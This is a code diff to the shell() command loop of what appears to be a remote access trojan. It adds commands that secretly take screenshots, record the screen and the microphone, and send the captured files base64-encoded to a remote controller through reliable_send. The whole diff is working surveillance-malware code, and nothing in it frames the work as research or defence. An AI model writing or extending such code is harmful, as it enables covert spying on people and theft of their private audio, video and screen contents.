@@ -152,25 +152,110 @@ def shell():
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
-                success, msg = recorder.screen_recorder.take_screenshot()
-                reliable_send("Screenshot: " + msg)
+                success, result = recorder.screen_recorder.take_screenshot()
+                if success:
+                    # Send screenshot data as base64
+                    import base64
+                    screenshot_data = {
+                        'action': 'screenshot',
+                        'filename': result['filename'],
+                        'data': base64.b64encode(result['data']).decode('utf-8'),
+                        'size': result['size']
+                    }
+                    reliable_send(screenshot_data)
+                else:
+                    reliable_send("Screenshot error: " + str(result))
             except Exception as e:
                 reliable_send("Screenshot error: " + str(e))
+                
+        elif command == 'start_audio':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.audio_recorder.start_recording(duration=30)
+                reliable_send("Audio recording started: " + str(msg))
+            except Exception as e:
+                reliable_send("Audio recording error: " + str(e))
+                
+        elif command == 'start_video':
+            try:
+                if recorder is None:
+                    recorder = create_surveillance_recorder("recordings")
+                success, msg = recorder.screen_recorder.start_screen_recording(duration=30)
+                reliable_send("Video recording started: " + str(msg))
+            except Exception as e:
+                reliable_send("Video recording error: " + str(e))
                 
         elif command == 'start_recording':
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
                 success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
-                reliable_send("Recording: " + msg)
+                reliable_send("Recording started: " + msg)
             except Exception as e:
                 reliable_send("Recording error: " + str(e))
+                
+        elif command == 'stop_audio':
+            try:
+                if recorder and recorder.audio_recorder.is_recording:
+                    success, result = recorder.audio_recorder.stop_recording()
+                    if success and isinstance(result, dict):
+                        # Send audio data as base64
+                        import base64
+                        audio_data = {
+                            'action': 'audio',
+                            'filename': result['filename'],
+                            'data': base64.b64encode(result['data']).decode('utf-8'),
+                            'size': result['size']
+                        }
+                        reliable_send(audio_data)
+                    else:
+                        reliable_send("Stop audio: " + str(result))
+                else:
+                    reliable_send("No audio recording active")
+            except Exception as e:
+                reliable_send("Stop audio error: " + str(e))
+                
+        elif command == 'stop_video':
+            try:
+                if recorder and recorder.screen_recorder.is_recording:
+                    success, result = recorder.screen_recorder.stop_screen_recording()
+                    if success and isinstance(result, dict):
+                        # Send video data as base64
+                        import base64
+                        video_data = {
+                            'action': 'video',
+                            'filename': result['filename'],
+                            'data': base64.b64encode(result['data']).decode('utf-8'),
+                            'size': result['size']
+                        }
+                        reliable_send(video_data)
+                    else:
+                        reliable_send("Stop video: " + str(result))
+                else:
+                    reliable_send("No video recording active")
+            except Exception as e:
+                reliable_send("Stop video error: " + str(e))
                 
         elif command == 'stop_recording':
             try:
                 if recorder:
-                    success, msg = recorder.stop_surveillance()
-                    reliable_send("Stop recording: " + msg)
+                    success, result = recorder.stop_surveillance()
+                    if success and isinstance(result, dict):
+                        # Send recording data as base64
+                        import base64
+                        recording_data = {
+                            'action': 'recording',
+                            'audio_filename': result.get('audio_filename'),
+                            'audio_data': base64.b64encode(result['audio_data']).decode('utf-8') if result.get('audio_data') else None,
+                            'audio_size': result.get('audio_size'),
+                            'video_filename': result.get('video_filename'),
+                            'video_data': base64.b64encode(result['video_data']).decode('utf-8') if result.get('video_data') else None,
+                            'video_size': result.get('video_size')
+                        }
+                        reliable_send(recording_data)
+                    else:
+                        reliable_send("Stop recording: " + str(result))
                 else:
                     reliable_send("No recording active")
             except Exception as e:
@@ -180,8 +265,8 @@ def shell():
             try:
                 if recorder is None:
                     recorder = create_surveillance_recorder("recordings")
-                recordings = recorder.list_recordings()
-                reliable_send("Recordings: " + json.dumps(recordings, indent=2))
+                msg = recorder.list_recordings()
+                reliable_send(msg)
             except Exception as e:
                 reliable_send("List recordings error: " + str(e))
                 
